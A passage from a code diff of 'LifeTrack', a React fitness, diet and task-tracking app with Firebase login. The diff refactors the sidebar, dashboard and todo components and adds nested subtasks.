-            const [globalDate, setGlobalDate] = useState(getTodayString());
-            const [darkMode, setDarkMode] = useState(false);
-            const [showSettings, setShowSettings] = useState(false);
-            const [goals, setGoals] = useState({ calories: 2500, protein: 160, water: 4 });
-
-            useEffect(() => {
-                const unsubscribe = auth.onAuthStateChanged((u) => {
-                    if (u) setUser(u);
-                    else setUser(null);
-                    setLoading(false);
-                });
-                return unsubscribe;
-            }, []);
-
-            useEffect(() => {
-                if(darkMode) document.documentElement.classList.add('dark');
-                else document.documentElement.classList.remove('dark');
-            }, [darkMode]);
-
-            useEffect(() => {
-                if (user && user.uid !== 'guest') db.collection('users').doc(user.uid).set({ goals }, { merge: true });
-                else if (user && user.uid === 'guest') localStorage.setItem('lifetrack_goals', JSON.stringify(goals));
-            }, [goals, user]);
-
-            useEffect(() => {
-                if(user && user.uid !== 'guest') {
-                    db.collection('users').doc(user.uid).get().then(doc => { if(doc.exists && doc.data().goals) setGoals(doc.data().goals); });
-                } else if (user && user.uid === 'guest') {
-                    const saved = localStorage.getItem('lifetrack_goals');
-                    if (saved) setGoals(JSON.parse(saved));
-                }
-            }, [user]);
-
-            const login = () => {
-                if (window.location.protocol === 'file:') {
-                    alert("Google Login 'file://' se kaam nahi karega. \n\nKripya VS Code ka 'Live Server' use karein ya Netlify par upload karein.\n\nAbhi ke liye 'Guest Mode' use karein.");
-                    return;
-                }
-
-                const provider = new firebase.auth.GoogleAuthProvider();
-                auth.signInWithPopup(provider)
-                    .then((result) => {
-                        console.log("Login Success:", result.user);
-                    })
-                    .catch(err => {
-                        console.error("Login Error:", err);
-                        let msg = "Login Failed: " + err.message;
-                        if (err.code === 'auth/unauthorized-domain') {
-                            msg = "Domain Authorized Nahi Hai!\n\nFirebase Console mein is domain ko add karein:\n" + window.location.hostname;
-                        } else if (err.code === 'auth/operation-not-supported-in-this-environment') {
-                            msg = "Yeh environment Google Login support nahi karta (shyad 'file://' ya restricted browser).\n\nKripya 'Guest Mode' use karein.";
-                        } else if (err.code === 'auth/popup-closed-by-user') {
-                            msg = "Login popup band kar diya gaya.";
-                        }
-                        alert(msg);
-                    });
-            };
-
-            const loginAsGuest = () => { setUser({ uid: 'guest', photoURL: 'https://cdn-icons-png.flaticon.com/512/149/149071.png', displayName: 'Guest' }); };
-            
-            const handleSaveSettings = () => {
-                setShowSettings(false);
-            }
-
-            if (loading) return <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-dark-900 text-gray-500">Loading...</div>;
-
-            if (!user) {
-                return (
-                    <div className="min-h-screen flex flex-col items-center justify-center bg-primary-50 p-6">
-                        <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-sm text-center animate-fade-in">
-                            <div className="flex justify-center mb-4 text-primary-600"><Activity size={48} /></div>
-                            <h1 className="text-2xl font-bold text-gray-800 mb-2">LifeTrack</h1>
-                            <p className="text-gray-500 mb-8 text-sm">Your personal hub for fitness, diet & life.</p>
-                            <button onClick={login} className="w-full flex items-center justify-center gap-3 bg-white border border-gray-300 p-3 rounded-xl hover:bg-gray-50 transition shadow-sm font-medium text-gray-700 mb-3"><GoogleIcon /> Sign in with Google</button>
-                            <div className="relative flex py-2 items-center"><div className="flex-grow border-t border-gray-300"></div><span className="flex-shrink mx-4 text-gray-400 text-xs">OR</span><div className="flex-grow border-t border-gray-300"></div></div>
-                            <button onClick={loginAsGuest} className="w-full flex items-center justify-center gap-3 bg-gray-800 text-white p-3 rounded-xl hover:bg-gray-900 transition shadow-md font-medium mt-3"><GuestIcon /> Skip Login (Guest Mode)</button>
-                            <p className="text-[10px] text-gray-400 mt-4">Guest data stays on this device only.</p>
-                        </div>
-                    </div>
-                );
-            }
-
+        function Sidebar({ activeTab, setActiveTab, user, setDarkMode, darkMode, setShowSettings }) {
             return (
-                <ToastProvider>
-                    <div className="flex h-screen bg-gray-50 dark:bg-dark-900 text-gray-900 dark:text-gray-100 overflow-hidden">
-                        
-                        {/* SIDEBAR FOR DESKTOP */}
-                        <aside className="hidden md:flex w-64 flex-col bg-white dark:bg-dark-800 border-r border-gray-200 dark:border-gray-700">
-                            <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} user={user} setDarkMode={setDarkMode} darkMode={darkMode} setShowSettings={setShowSettings} />
-                        </aside>
-
-                        {/* MAIN CONTENT AREA */}
-                        <div className="flex-1 flex flex-col min-w-0 overflow-hidden relative">
-                            {/* MOBILE HEADER */}
-                            <header className="md:hidden bg-white dark:bg-dark-800 border-b border-gray-200 dark:border-gray-700 p-4 sticky top-0 z-30">
-                                <div className="max-w-md mx-auto flex justify-between items-center">
-                                    <div className="flex items-center gap-2 text-primary-600 dark:text-primary-500"><Activity size={28} /><h1 className="text-xl font-bold tracking-tight text-gray-900 dark:text-white">LifeTrack</h1></div>
-                                    <div className="flex items-center gap-4">
-                                        <button onClick={() => setDarkMode(!darkMode)} className="text-gray-500 dark:text-gray-400">{darkMode ? <Sun size={20} /> : <Moon size={20} />}</button>
-                                        <button onClick={() => setShowSettings(true)} className="text-gray-500 dark:text-gray-400"><Settings size={20} /></button>
-                                        <img src={user.photoURL} alt="User" className="w-8 h-8 rounded-full border border-gray-300 dark:border-gray-600" />
-                                    </div>
-                                </div>
-                            </header>
-
-                            {/* GLOBAL DATE NAVIGATOR (Visible on ALL tabs) */}
-                            <DateNavigator selectedDate={globalDate} setSelectedDate={setGlobalDate} />
-
-                            <div className="scroll-container bg-gray-50 dark:bg-dark-900 w-full">
-                                <main className="max-w-md mx-auto p-4">
-                                    {activeTab === 'dashboard' && <DashboardSection userId={user.uid} selectedDate={globalDate} setSelectedDate={setGlobalDate} goals={goals} />}
-                                    {activeTab === 'todo' && <TodoSection userId={user.uid} selectedDate={globalDate} setSelectedDate={setGlobalDate} />}
-                                    {activeTab === 'gym' && <GymSection userId={user.uid} selectedDate={globalDate} />}
-                                    {activeTab === 'diet' && <DietSection userId={user.uid} selectedDate={globalDate} goals={goals} />}
-                                </main>
-                            </div>
-
-                            {/* MOBILE BOTTOM NAV */}
-                            <nav className="md:hidden fixed bottom-0 left-0 right-0 bg-white dark:bg-dark-800 border-t border-gray-200 dark:border-gray-700 px-6 py-3 flex justify-between items-center z-40 pb-safe">
-                                <NavButton active={activeTab === 'dashboard'} onClick={() => setActiveTab('dashboard')} icon={<Home size={24} />} label="Home" />
-                                <NavButton active={activeTab === 'todo'} onClick={() => setActiveTab('todo')} icon={<CheckSquare size={24} />} label="Tasks" />
-                                <NavButton active={activeTab === 'gym'} onClick={() => setActiveTab('gym')} icon={<Dumbbell size={24} />} label="Gym" />
-                                <NavButton active={activeTab === 'diet'} onClick={() => setActiveTab('diet')} icon={<Utensils size={24} />} label="Diet" />
-                            </nav>
-                        </div>
-
-                        {/* SETTINGS MODAL */}
-                        {showSettings && (
-                            <div className="fixed inset-0 bg-black/50 z-[100] flex items-center justify-center p-4 backdrop-blur-sm">
-                                <div className="bg-white dark:bg-dark-800 w-full max-w-sm rounded-2xl shadow-2xl p-6 animate-slide-up">
-                                    <div className="flex justify-between items-center mb-6"><h3 className="text-lg font-bold text-gray-900 dark:text-white">Adjust Goals</h3><button onClick={() => setShowSettings(false)}><XIcon size={24} className="text-gray-400" /></button></div>
-                                    <div className="space-y-4">
-                                        <div><label className="text-xs font-bold uppercase text-gray-500 mb-1 block">Daily Calories</label><input type="number" value={goals.calories} onChange={e => setGoals({...goals, calories: Number(e.target.value)})} className="w-full p-3 rounded-lg border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white" /></div>
-                                        <div><label className="text-xs font-bold uppercase text-gray-500 mb-1 block">Daily Protein</label><input type="number" value={goals.protein} onChange={e => setGoals({...goals, protein: Number(e.target.value)})} className="w-full p-3 rounded-lg border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white" /></div>
-                                        <div><label className="text-xs font-bold uppercase text-gray-500 mb-1 block">Daily Water</label><input type="number" value={goals.water} onChange={e => setGoals({...goals, water: Number(e.target.value)})} className="w-full p-3 rounded-lg border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white" /></div>
-                                        <button onClick={() => { auth.signOut(); setUser(null); setShowSettings(false); }} className="w-full py-3 text-red-500 font-medium text-sm mt-4 border border-red-100 dark:border-red-900 rounded-lg hover:bg-red-50">Sign Out</button>
-                                        <button onClick={handleSaveSettings} className="w-full py-3 bg-primary-600 text-white rounded-lg font-bold shadow-lg hover:bg-primary-700">Save Goals</button>
-                                    </div>
-                                </div>
-                            </div>
-                        )}
+                <div className="flex flex-col h-full p-4">
+                    <div className="flex items-center gap-2 text-primary-600 dark:text-primary-500 mb-8 px-2"><Activity size={32} /><h1 className="text-2xl font-bold dark:text-white">LifeTrack</h1></div>
+                    <div className="flex-1 space-y-1">
+                        {[{id: 'dashboard', Icon: Home, label: 'Dashboard'}, {id: 'todo', Icon: CheckSquare, label: 'Tasks'}, {id: 'gym', Icon: Dumbbell, label: 'Gym'}, {id: 'diet', Icon: Utensils, label: 'Diet'}].map(({id, Icon, label}) => (
+                            <button key={id} onClick={() => setActiveTab(id)} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === id ? 'bg-primary-50 text-primary-700 dark:bg-primary-900/30 dark:text-primary-400 font-bold' : 'text-gray-600 dark:text-gray-400 hover:bg-gray-50 dark:hover:bg-gray-800'}`}><Icon size={20} /> {label}</button>
+                        ))}
                     </div>
-                </ToastProvider>
+                    <div className="border-t border-gray-200 dark:border-gray-700 pt-4 space-y-2">
+                        <button onClick={() => setDarkMode(!darkMode)} className="w-full flex items-center gap-3 px-4 py-2 rounded-lg text-gray-600 dark:text-gray-400 hover:bg-gray-50 dark:hover:bg-gray-800">{darkMode ? <Sun size={20} /> : <Moon size={20} />} Theme</button>
+                        <button onClick={() => setShowSettings(true)} className="w-full flex items-center gap-3 px-4 py-2 rounded-lg text-gray-600 dark:text-gray-400 hover:bg-gray-50 dark:hover:bg-gray-800"><Settings size={20} /> Settings</button>
+                        <div className="flex items-center gap-3 px-4 py-2 mt-4 bg-gray-50 dark:bg-gray-800 rounded-xl">
+                            <img src={user.photoURL} className="w-8 h-8 rounded-full border border-gray-200" /><div className="flex-1 overflow-hidden"><p className="text-xs font-bold truncate dark:text-white">{user.displayName}</p><button onClick={() => auth.signOut()} className="text-[10px] text-red-500 flex items-center gap-1">Log Out <Logout size={10}/></button></div>
+                        </div>
+                    </div>
+                </div>
             );
         }
 
@@ -602,19 +427,15 @@
             );
         }
 
-        // --- DASHBOARD SECTION ---
-        function DashboardSection({ userId, selectedDate, setSelectedDate, goals }) {
+        function DashboardSection({ userId, selectedDate, goals }) {
             const { data: diet } = useFirestore(userId, 'diet');
             const { data: todos } = useFirestore(userId, 'todos');
             const { data: water } = useFirestore(userId, 'water');
             const { data: gym } = useFirestore(userId, 'gym'); 
-
-            const displayDate = new Date(selectedDate).toLocaleDateString('en-US', { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric' });
-            const isToday = selectedDate === new Date().toISOString().split('T')[0];
-            const changeDate = (days) => { const date = new Date(selectedDate); date.setDate(date.getDate() + days); setSelectedDate(date.toISOString().split('T')[0]); };
             
             const todaysMeals = diet.filter(m => m.date === selectedDate && m.completed);
             const calCurrent = todaysMeals.reduce((acc, curr) => acc + Number(curr.calories), 0);
+            const protCurrent = todaysMeals.reduce((acc, curr) => acc + Number(curr.protein), 0);
             const waterLog = water.find(w => w.date === selectedDate);
             const waterCurrent = waterLog ? waterLog.amount : 0;
             const todaysTasks = todos.filter(t => t.date === selectedDate);
@@ -624,29 +445,27 @@
             const calPct = goals.calories ? Math.round((calCurrent/goals.calories)*100) : 0;
             const waterPct = goals.water ? Math.round((waterCurrent/goals.water)*100) : 0;
             const taskPct = tasksTotal ? Math.round((tasksDone/tasksTotal)*100) : 0;
-            const protCurrent = todaysMeals.reduce((acc, curr) => acc + Number(curr.protein), 0);
+
+            const displayDate = new Date(selectedDate).toLocaleDateString('en-US', { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric' });
+            const isToday = selectedDate === getTodayString();
 
             return (
                 <div className="space-y-6 animate-fade-in max-w-5xl mx-auto">
                     <div className="bg-gradient-to-r from-primary-600 to-indigo-700 rounded-2xl p-6 text-white shadow-xl hover-card">
                         <h2 className="text-2xl font-bold mb-1">Hello, {userId === 'guest' ? 'Guest' : 'Chief'}! 👋</h2>
-                        <p className="text-indigo-100 text-sm mb-6">Here is your summary.</p>
+                        <p className="text-indigo-100 text-sm mb-6">Here is your summary for {isToday ? 'today' : displayDate}.</p>
                         <div className="flex justify-between text-center divide-x divide-indigo-500/30">
                             <div className="px-4"><div className="text-2xl font-bold">{calPct}%</div><div className="text-[10px] uppercase opacity-70 tracking-wider">Diet</div></div>
                             <div className="px-4"><div className="text-2xl font-bold">{taskPct}%</div><div className="text-[10px] uppercase opacity-70 tracking-wider">Tasks</div></div>
                             <div className="px-4"><div className="text-2xl font-bold">{waterPct}%</div><div className="text-[10px] uppercase opacity-70 tracking-wider">Hydration</div></div>
                         </div>
                     </div>
-
-                    {/* Stats Grid */}
                     <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                         <div className="bg-white dark:bg-dark-800 p-4 rounded-xl border border-gray-100 dark:border-gray-700 shadow-sm hover-card">
                             <div className="flex items-center gap-2 text-primary-500 mb-2 font-bold text-sm"><CheckSquare size={16} /> Tasks</div>
                             <div className="text-2xl font-bold text-gray-900 dark:text-white">{tasksDone}<span className="text-gray-400 text-sm">/{tasksTotal}</span></div>
                             <div className="w-full bg-gray-100 dark:bg-gray-700 h-1.5 rounded-full mt-2 overflow-hidden"><div className="bg-primary-500 h-full rounded-full transition-all duration-1000" style={{width: `${tasksTotal ? (tasksDone/tasksTotal)*100 : 0}%`}}></div></div>
                         </div>
-                        
-                        {/* MERGED CALS/PROT CARD */}
                         <div className="bg-white dark:bg-dark-800 p-3 rounded-xl border border-gray-100 dark:border-gray-700 shadow-sm flex flex-col justify-center gap-3 hover-card">
                             <div className="flex items-center justify-between">
                                 <div className="flex items-center gap-1 text-orange-500 font-bold text-xs"><Flame size={14} /> Cals</div>
@@ -655,24 +474,15 @@
                             </div>
                             <div className="space-y-2">
                                 <div>
-                                    <div className="flex justify-between text-[10px] text-gray-500 mb-0.5">
-                                        <span>{calCurrent}</span><span>{goals.calories}</span>
-                                    </div>
-                                    <div className="w-full bg-gray-100 dark:bg-gray-700 h-1.5 rounded-full overflow-hidden">
-                                        <div className="bg-orange-500 h-full rounded-full transition-all duration-1000" style={{width: `${Math.min((calCurrent/goals.calories)*100, 100)}%`}}></div>
-                                    </div>
+                                    <div className="flex justify-between text-[10px] text-gray-500 mb-0.5"><span>{calCurrent}</span><span>{goals.calories}</span></div>
+                                    <div className="w-full bg-gray-100 dark:bg-gray-700 h-1.5 rounded-full overflow-hidden"><div className="bg-orange-500 h-full rounded-full transition-all duration-1000" style={{width: `${Math.min((calCurrent/goals.calories)*100, 100)}%`}}></div></div>
                                 </div>
                                 <div>
-                                    <div className="flex justify-between text-[10px] text-gray-500 mb-0.5">
-                                        <span>{protCurrent}g</span><span>{goals.protein}g</span>
-                                    </div>
-                                    <div className="w-full bg-gray-100 dark:bg-gray-700 h-1.5 rounded-full overflow-hidden">
-                                        <div className="bg-blue-500 h-full rounded-full transition-all duration-1000" style={{width: `${Math.min((protCurrent/goals.protein)*100, 100)}%`}}></div>
-                                    </div>
+                                    <div className="flex justify-between text-[10px] text-gray-500 mb-0.5"><span>{protCurrent}g</span><span>{goals.protein}g</span></div>
+                                    <div className="w-full bg-gray-100 dark:bg-gray-700 h-1.5 rounded-full overflow-hidden"><div className="bg-blue-500 h-full rounded-full transition-all duration-1000" style={{width: `${Math.min((protCurrent/goals.protein)*100, 100)}%`}}></div></div>
                                 </div>
                             </div>
                         </div>
-
                         <div className="bg-white dark:bg-dark-800 p-4 rounded-xl border border-gray-100 dark:border-gray-700 shadow-sm hover-card">
                             <div className="flex items-center gap-2 text-cyan-500 mb-2 font-bold text-sm"><Droplet size={16} /> Water</div>
                             <div className="text-2xl font-bold text-gray-900 dark:text-white">{waterCurrent}L</div><div className="text-xs text-gray-400">of {goals.water}L</div>
@@ -685,14 +495,24 @@
             );
         }
 
-        // --- SUBTASK PAGE ---
         function TaskDetailsPage({ task, onClose, onUpdate }) {
             const [newSub, setNewSub] = useState('');
             const [noteText, setNoteText] = useState(task.note || '');
+            const [activeSubtaskForDetails, setActiveSubtaskForDetails] = useState(null);
+
             const handleNoteChange = (e) => { setNoteText(e.target.value); onUpdate(task.id, { ...task, note: e.target.value }); };
-            const handleAddSub = (e) => { e.preventDefault(); if(!newSub.trim()) return; const updated = [...(task.subtasks || []), { id: Date.now(), text: newSub, completed: false }]; onUpdate(task.id, { ...task, subtasks: updated }); setNewSub(''); };
+            const handleAddSub = (e) => { e.preventDefault(); if(!newSub.trim()) return; const updated = [...(task.subtasks || []), { id: Date.now(), text: newSub, completed: false, subtasks: [], note: "" }]; onUpdate(task.id, { ...task, subtasks: updated }); setNewSub(''); };
             const toggleSub = (subId) => { const updated = task.subtasks.map(s => s.id === subId ? { ...s, completed: !s.completed } : s); onUpdate(task.id, { ...task, subtasks: updated }); };
             const deleteSub = (subId) => { const updated = task.subtasks.filter(s => s.id !== subId); onUpdate(task.id, { ...task, subtasks: updated }); };
+            
+            const handleSubtaskUpdate = (subId, updatedData) => {
+                const updatedSubtasks = task.subtasks.map(s => s.id === subId ? updatedData : s);
+                onUpdate(task.id, { ...task, subtasks: updatedSubtasks });
+                if (activeSubtaskForDetails && activeSubtaskForDetails.id === subId) {
+                    setActiveSubtaskForDetails(updatedData);
+                }
+            };
+
             const total = task.subtasks ? task.subtasks.length : 0;
             const completed = task.subtasks ? task.subtasks.filter(s => s.completed).length : 0;
 
@@ -700,43 +520,48 @@
                 <div className="fixed inset-0 bg-white dark:bg-dark-900 z-50 flex flex-col animate-slide-in">
                     <div className="bg-primary-600 p-4 text-white shadow-md flex items-center gap-3">
                         <button onClick={onClose} className="p-1 hover:bg-primary-700 rounded"><ArrowLeft size={24} /></button>
-                        <div className="flex-1">
-                            <h3 className="font-bold text-lg leading-tight">{task.text}</h3>
-                            <p className="text-xs text-primary-200 mt-0.5">Details & Notes</p>
-                        </div>
+                        <div className="flex-1"><h3 className="font-bold text-lg leading-tight truncate">{task.text}</h3></div>
                     </div>
                     <div className="flex-1 overflow-y-auto p-4 space-y-6">
                         <div>
-                            <div className="flex justify-between items-center mb-2">
-                                <h4 className="text-xs font-bold text-gray-500 dark:text-gray-400 uppercase tracking-wide">Checklist</h4>
-                                <span className="text-xs font-medium bg-gray-100 dark:bg-dark-800 px-2 py-1 rounded text-gray-600 dark:text-gray-300">{completed}/{total} Done</span>
-                            </div>
+                            <div className="flex justify-between items-center mb-2"><h4 className="text-xs font-bold text-gray-500 dark:text-gray-400 uppercase tracking-wide">Checklist</h4><span className="text-xs font-medium bg-gray-100 dark:bg-dark-800 px-2 py-1 rounded text-gray-600 dark:text-gray-300">{completed}/{total} Done</span></div>
                             <form onSubmit={handleAddSub} className="flex gap-2 mb-3">
-                                <input type="text" value={newSub} onChange={e => setNewSub(e.target.value)} placeholder="Add item..." className="flex-1 p-3 bg-gray-50 dark:bg-dark-800 border border-gray-200 dark:border-gray-700 rounded-xl focus:outline-none focus:ring-2 focus:ring-primary-500 dark:text-white transition-all" />
+                                <input type="text" value={newSub} onChange={e => setNewSub(e.target.value)} placeholder="Add subtask..." className="flex-1 p-3 bg-gray-50 dark:bg-dark-800 border border-gray-200 dark:border-gray-700 rounded-xl focus:outline-none focus:ring-2 focus:ring-primary-500 dark:text-white transition-all" />
                                 <button className="bg-primary-600 text-white px-4 rounded-xl hover:bg-primary-700 font-bold text-xl flex items-center justify-center"><Plus size={24} /></button>
                             </form>
                             <div className="space-y-2">
-                                {task.subtasks?.map(sub => (
-                                    <div key={sub.id} className="flex items-center justify-between p-3 bg-white dark:bg-dark-800 rounded-xl border border-gray-100 dark:border-gray-700 shadow-sm transition-all hover-card">
-                                        <div className="flex items-center gap-3 overflow-hidden">
-                                            <button onClick={() => toggleSub(sub.id)} className={`flex-shrink-0 text-xl transition-colors ${sub.completed ? 'text-green-500' : 'text-gray-300 dark:text-gray-600'}`}>{sub.completed ? <CheckCircle size={24} /> : <Circle size={24} />}</button>
-                                            <span className={`text-base font-medium truncate ${sub.completed ? 'line-through text-gray-400 dark:text-gray-500' : 'text-gray-700 dark:text-gray-200'}`}>{sub.text}</span>
+                                {task.subtasks?.map(sub => {
+                                    const nestedCount = sub.subtasks ? sub.subtasks.length : 0;
+                                    const nestedCompleted = sub.subtasks ? sub.subtasks.filter(s => s.completed).length : 0;
+                                    return (
+                                        <div key={sub.id} className="flex items-center justify-between p-3 bg-white dark:bg-dark-800 rounded-xl border border-gray-100 dark:border-gray-700 shadow-sm transition-all hover-card">
+                                            <div className="flex items-center gap-3 overflow-hidden flex-1">
+                                                <button onClick={() => toggleSub(sub.id)} className={`flex-shrink-0 text-xl transition-colors ${sub.completed ? 'text-green-500' : 'text-gray-300 dark:text-gray-600'}`}>{sub.completed ? <CheckCircle size={24} /> : <Circle size={24} />}</button>
+                                                <div className="flex flex-col">
+                                                    <span className={`text-base font-medium truncate ${sub.completed ? 'line-through text-gray-400 dark:text-gray-500' : 'text-gray-700 dark:text-gray-200'}`}>{sub.text}</span>
+                                                    {nestedCount > 0 && <span className="text-[10px] bg-gray-100 dark:bg-gray-700 text-gray-500 dark:text-gray-300 px-1.5 py-0.5 rounded-md flex items-center gap-1 w-fit mt-1"><FileText size={10} /> {nestedCompleted}/{nestedCount}</span>}
+                                                </div>
+                                            </div>
+                                            <div className="flex items-center gap-2">
+                                                <button onClick={() => setActiveSubtaskForDetails(sub)} className="p-1.5 bg-gray-100 dark:bg-gray-700 rounded-lg text-gray-500 dark:text-gray-300"><FileText size={16} /></button>
+                                                <button onClick={() => deleteSub(sub.id)} className="text-gray-300 hover:text-red-500 p-1"><Trash2 size={16} /></button>
+                                            </div>
                                         </div>
-                                        <button onClick={() => deleteSub(sub.id)} className="text-gray-300 hover:text-red-500 p-2"><Trash2 size={18} /></button>
-                                    </div>
-                                ))}
+                                    );
+                                })}
                             </div>
                         </div>
                         <div>
                             <h4 className="text-xs font-bold text-gray-500 dark:text-gray-400 uppercase tracking-wide mb-2">Notes</h4>
-                            <textarea value={noteText} onChange={handleNoteChange} placeholder="Type extra details here..." className="w-full h-40 p-4 bg-yellow-50 dark:bg-yellow-900/10 border border-yellow-200 dark:border-yellow-900/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-yellow-400 text-gray-700 dark:text-yellow-100 resize-none leading-relaxed"></textarea>
+                            <textarea value={noteText} onChange={handleNoteChange} placeholder="Type notes here..." className="w-full h-40 p-4 bg-yellow-50 dark:bg-yellow-900/10 border border-yellow-200 dark:border-yellow-900/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-yellow-400 text-gray-700 dark:text-yellow-100 resize-none leading-relaxed"></textarea>
                         </div>
                     </div>
+                    {activeSubtaskForDetails && <TaskDetailsPage task={activeSubtaskForDetails} onClose={() => setActiveSubtaskForDetails(null)} onUpdate={handleSubtaskUpdate} />}
                 </div>
             );
         }
 
-        // --- TODO SECTION (With Logic & Sort) ---
+        // --- TODO SECTION ---
         function TodoSection({ userId, selectedDate, setSelectedDate }) {
             const { showToast } = useContext(ToastContext);
             const { data: tasks, add: addTaskToDb, update: updateTaskInDb, remove: removeTaskFromDb } = useFirestore(userId, 'todos');
@@ -763,6 +588,7 @@
                     if (isStarted && isNotEnded && isCorrectDay) {
                         const deletedDoc = deletedInstances.find(d => d.ruleId === rule.id && d.date === selectedDate);
                         const exists = tasks.some(t => t.ruleId === rule.id && t.date === selectedDate);
+                        
                         if (!deletedDoc && !exists) {
                             const derivedTime = isNaN(Number(rule.id)) ? '0' : new Date(Number(rule.id)).toISOString();
                             generatedTasks.push({ id: `virtual_${rule.id}_${selectedDate}`, text: rule.text, category: rule.category, completed: false, date: selectedDate, ruleId: rule.id, subtasks: [], note: "", isVirtual: true, createdAt: derivedTime });
@@ -809,23 +635,13 @@
                 } else { 
                     const taskData = { ...task };
                     const cleanTaskData = cleanData(taskData);
-                    
                     removeTaskFromDb(task.id);
-                    
                     if (task.ruleId) { 
                         addDeletedInstance({ ruleId: task.ruleId, date: selectedDate }).then((ref) => {
-                             showToast('Task Deleted', 'default', {
-                                label: 'UNDO',
-                                onClick: () => {
-                                    removeDeletedInstance(ref.id);
-                                }
-                             });
+                             showToast('Task Deleted', 'default', { label: 'UNDO', onClick: () => { removeDeletedInstance(ref.id); } });
                         });
                     } else {
-                        showToast('Task Deleted', 'default', {
-                            label: 'UNDO',
-                            onClick: () => addTaskToDb(cleanTaskData)
-                        });
+                        showToast('Task Deleted', 'default', { label: 'UNDO', onClick: () => addTaskToDb(cleanTaskData) });
                     }
                 } 
             };
@@ -839,7 +655,6 @@
             const initiateToggleDaily = (task) => {
                 const rule = dailyRules.find(r => r.id === task.ruleId);
                 const isRepeating = rule && (rule.endDate === null || rule.endDate > selectedDate);
-                
                 if (isRepeating) {
                     if(rule) updateRule(rule.id, { endDate: selectedDate });
                     showToast('Recurring Disabled');
@@ -866,14 +681,7 @@
             const handleBulkAdd = (tasks) => {
                 tasks.forEach(t => {
                     setTimeout(() => {
-                        addTaskToDb({
-                            text: t.text,
-                            category: t.category,
-                            completed: false,
-                            date: t.date,
-                            subtasks: [],
-                            note: ""
-                        });
+                        addTaskToDb({ text: t.text, category: t.category, completed: false, date: t.date, subtasks: [], note: "" });
                     }, 50);
                 });
                 showToast(`${tasks.length} Tasks Added!`);
@@ -889,36 +697,22 @@
             };
 
             return (
-                <div className="space-y-6 animate-slide-in">
+                <div className="space-y-6 animate-slide-in max-w-5xl mx-auto">
                     <form onSubmit={handleAddTask} className="flex flex-col gap-3">
                         <input type="text" value={newTask} onChange={(e) => setNewTask(e.target.value)} placeholder="Add a new task..." className="w-full p-4 rounded-xl border border-gray-200 dark:border-gray-700 bg-white dark:bg-dark-800 dark:text-white shadow-sm focus:ring-2 focus:ring-primary-500 outline-none" />
-                        
                         <div className="flex gap-2">
-                            <button type="button" onClick={() => setShowBulkAdd(true)} className="p-3 rounded-xl border border-gray-200 dark:border-gray-700 bg-white dark:bg-dark-800 text-gray-500 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700 transition">
-                                <ListIcon size={24} />
-                            </button>
-                            <select 
-                                value={category} 
-                                onChange={(e) => setCategory(e.target.value)}
-                                className="flex-1 p-3 rounded-xl border border-gray-200 dark:border-gray-700 bg-white dark:bg-dark-800 dark:text-white text-sm focus:outline-none"
-                            >
-                                <option value="General">General</option>
-                                <option value="Work">Work</option>
-                                <option value="Health">Health</option>
-                                <option value="Personal">Personal</option>
+                            <button type="button" onClick={() => setShowBulkAdd(true)} className="p-3 rounded-xl border border-gray-200 dark:border-gray-700 bg-white dark:bg-dark-800 text-gray-500 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700 transition"><ListIcon size={24} /></button>
+                            <select value={category} onChange={(e) => setCategory(e.target.value)} className="flex-1 p-3 rounded-xl border border-gray-200 dark:border-gray-700 bg-white dark:bg-dark-800 dark:text-white text-sm focus:outline-none">
+                                <option value="General">General</option><option value="Work">Work</option><option value="Health">Health</option><option value="Personal">Personal</option>
                             </select>
-                            <button className="bg-primary-600 text-white px-6 rounded-xl font-bold shadow-md hover:bg-primary-700 transition flex items-center gap-2">
-                                <Plus size={20} /> Add
-                            </button>
+                            <button className="bg-primary-600 text-white px-6 rounded-xl font-bold shadow-md hover:bg-primary-700 transition flex items-center gap-2"><Plus size={20} /> Add</button>
                         </div>
                     </form>
 
-                    <div className="space-y-3">
+                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                         {localTasks.map(task => {
                             const activeRule = dailyRules.find(r => r.id === task.ruleId);
                             const isRepeating = activeRule && (activeRule.endDate === null || activeRule.endDate > selectedDate);
-                            
-                            // Calculate subtask counts
                             const subtaskCount = task.subtasks ? task.subtasks.length : 0;
                             const completedSubtasks = task.subtasks ? task.subtasks.filter(s => s.completed).length : 0;
 
@@ -928,19 +722,9 @@
                                         <button onClick={() => handleToggleTask(task)} className={`text-xl ${task.completed ? 'text-green-500' : 'text-gray-300 dark:text-gray-600'}`}>{task.completed ? <CheckCircle size={24} /> : <Circle size={24} />}</button>
                                         <div className="flex flex-col overflow-hidden">
                                             <span className={`font-medium truncate ${task.completed ? 'line-through text-gray-400' : 'text-gray-800 dark:text-white'}`}>{task.text}{isRepeating && <Repeat size={12} className="inline ml-1 text-primary-400" />}</span>
-                                            
                                             <div className="flex items-center gap-2 mt-1">
-                                                {/* Category Badge */}
-                                                <span className={`text-[10px] px-2 py-0.5 rounded-full w-fit ${getCategoryColor(task.category)}`}>
-                                                    {task.category}
-                                                </span>
-
-                                                {/* Subtask Count Badge */}
-                                                {subtaskCount > 0 && (
-                                                    <span className="text-[10px] px-2 py-0.5 rounded-full w-fit bg-gray-100 dark:bg-gray-700 text-gray-500 dark:text-gray-300 flex items-center gap-1">
-                                                        <FileText size={10} /> {completedSubtasks}/{subtaskCount}
-                                                    </span>
-                                                )}
+                                                <span className={`text-[10px] px-2 py-0.5 rounded-full w-fit ${getCategoryColor(task.category)}`}>{task.category}</span>
+                                                {subtaskCount > 0 && (<span className="text-[10px] px-2 py-0.5 rounded-full w-fit bg-gray-100 dark:bg-gray-700 text-gray-500 dark:text-gray-300 flex items-center gap-1"><FileText size={10} /> {completedSubtasks}/{subtaskCount}</span>)}
                                             </div>
                                         </div>
                                     </div>
@@ -960,39 +744,46 @@
             );
         }
 
-        // --- GYM SECTION (UI Polish & Sort) ---
+        // --- GYM SECTION ---
